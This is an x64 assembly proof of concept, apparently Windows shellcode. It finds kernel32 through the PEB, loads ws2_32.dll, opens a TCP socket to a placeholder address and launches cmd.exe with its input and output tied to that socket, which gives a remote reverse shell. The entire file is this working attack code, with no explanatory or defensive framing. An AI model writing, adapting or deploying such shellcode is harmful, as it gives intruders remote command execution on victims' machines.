BITS 64

; This POC is the maximized compressed for a single case.
; This scenario being a fully up-to-date WINDOWS machine
; in a local address region that is comfortable with the
; code crashing (executable program).

GET_KERNEL32:
        MOV     RAX,    GS:[0x60]
        MOV     RAX,    [RAX + 0x18]
        MOV     RAX,    [RAX + 0x30]
        MOV     RAX,    [RAX]
        MOV     RAX,    [RAX]
        MOV     RAX,    [RAX + 0x10]

GET_CREATEPROCESSA:
        LEA     R15,    [RAX + 0x44f70]

GET_LOADLIBRARYA:
        LEA     R14,    [RAX + 0x42d80]

LOAD_WS232:
        PUSH    0x006c6c
        MOV     RAX,    0x642e32335f327377
        PUSH    RAX
        MOV     ECX,    ESP
        SUB     ESP,    0x1a8
        CALL    R14

GET_WSASTARTUP:
        LEA     R14,    [RAX + 0x24020]

GET_WSASOCKET:
        LEA     R13,    [RAX + 0x2aec0]

GET_CONNECT:
        LEA     R12,    [RAX + 0xee00]

RUN_WSASTARTUP:
        MOV     CX,     0x0202
        MOV     EDX,    ESP
        CALL    R14

RUN_WSASOCKETA:
        XOR     R8,     R8
        XOR     R9,     R9
        MOV     CL,     0x02
        MOV     EDX,    0x01
        MOV     R8B,    0x06
        CALL    R13
        MOV     R14,    RAX

RUN_CONNECT:
        MOV     ECX,    EAX
        MOV     RAX,    0xcccccccccccc0002
        PUSH    RAX
        MOV     EDX,    ESP
        MOV     R8B,    0x10
        CALL    R12

RUN_CREATEPROCESSA:
        PUSH    RAX
        MOV     RCX,   0x006578652e646d63
        PUSH    RCX
        MOV     EDX,   ESP
        PUSH    R14
        PUSH    R14
        PUSH    R14
        PUSH    RAX
        PUSH    RAX
        XOR     RCX,   RCX
        MOV     CL,    0x01
        ROR     RCX,   0x18
        PUSH    RCX
        SUB     ESP,   0x30
        PUSH    0x68
        LEA     RCX,   [RSP - 0x20]
        MOV     R8,    RSP
        PUSH    RCX
        PUSH    R8
        PUSH    RAX
        PUSH    RAX
        PUSH    0x08000000
        PUSH    0x01
        PUSH    RAX
        PUSH    RAX
        PUSH    RAX
        PUSH    RAX
        MOV     ECX,   EAX
        CALL    R15